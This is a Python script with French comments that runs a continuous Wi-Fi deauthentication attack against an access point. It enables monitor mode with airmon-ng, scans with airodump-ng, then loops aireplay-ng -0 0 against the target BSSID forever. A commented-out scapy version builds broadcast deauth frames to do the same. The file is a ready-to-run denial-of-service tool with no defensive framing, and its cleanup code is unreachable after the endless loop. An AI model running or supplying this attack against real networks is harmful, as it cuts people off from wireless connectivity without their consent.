#!/usr/bin/python

from scapy.all import *
import subprocess
import utile
import os
import time
import signal

BSSID = utile.getAPMac()
timeout = time.time() + 60

subprocess.call('clear', shell=True)
print('Cartes disponibles ....')
subprocess.call('airmon-ng',shell=True)

networkCard = "wlan0"

print (networkCard)

subprocess.call('airmon-ng start {}'.format(networkCard), shell=True)
subprocess.call('airmon-ng check kill', shell=True)

networkCard = '{}mon'.format(networkCard)

try:
    subprocess.call('clear',shell=True)
    print('Scan ...')
    subprocess.call('airodump-ng -c 6 {}'.format(networkCard),shell=True)
except KeyboardInterrupt:
    print(''*3)

brdMac = 'ff:ff:ff:ff:ff:ff'


while True:
    #subprocess.call("aireplay-ng -0 0 -a {} {}".format(BSSID,networkCard),shell=True)
    os.system("aireplay-ng -0 0 -a {} {}".format(BSSID,networkCard))
    #packet = RadioTap() / Dot11(addr1= brdMac, addr2=BSSID,addr3= BSSID)/Dot11Deauth()
    #sendp(packet,iface = networkCard, count= 1000,inter= 0.2)

print('Cleaning ...')
subprocess.call("airmon-ng stop wlan0mon",shell=True)
subprocess.call("ifconfig wlan0 up",shell=True)
subprocess.call("service NetworkManager start",shell=True)
subprocess.call('clear',shell=True)
